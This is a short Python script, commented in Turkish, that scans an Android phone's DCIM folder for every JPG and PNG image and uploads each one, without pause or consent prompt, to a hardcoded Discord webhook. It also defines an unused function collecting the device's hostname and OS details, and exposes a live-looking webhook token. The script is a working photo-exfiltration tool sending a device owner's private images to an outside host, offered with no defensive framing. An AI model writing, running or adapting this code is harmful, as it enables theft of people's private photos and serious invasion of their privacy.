import os
import requests
import time
import socket
from tqdm import tqdm

WEBHOOK_URL = "https://discord.com/api/webhooks/1414709102415708260/fchkKmLpaYQDW09genXyEsvB3V6eerwvAuVxBPeQlve6h8sD31aowoM2pLbTefuWe0pl"  # Senin webhook adresin burada kalacak

def get_device_info():
    # Cihaz bilgisi fonksiyonu (örnek)
    return {
        "hostname": socket.gethostname(),
        "platform": os.uname().sysname,
        "release": os.uname().release
    }

def send_to_discord(image_path):
    with open(image_path, "rb") as f:
        files = {"file": f}
        requests.post(WEBHOOK_URL, files=files)

def main():
    # Fotoğraf dizini
    image_dir = "/storage/emulated/0/DCIM/"
    image_files = []

    # Alt dizinleri de tara
    for root, dirs, files in os.walk(image_dir):
        for file in files:
            if file.lower().endswith((".jpg", ".jpeg", ".png")):
                image_files.append(os.path.join(root, file))

    print(f"Toplam {len(image_files)} fotoğraf bulundu. Gönderiliyor...")

    for image_path in tqdm(image_files, desc="YÜKLENİYOR", unit="foto"):
        send_to_discord(image_path)
        # Bekleme yok, en hızlı şekilde yükler!

if __name__ == "__main__":
    main()
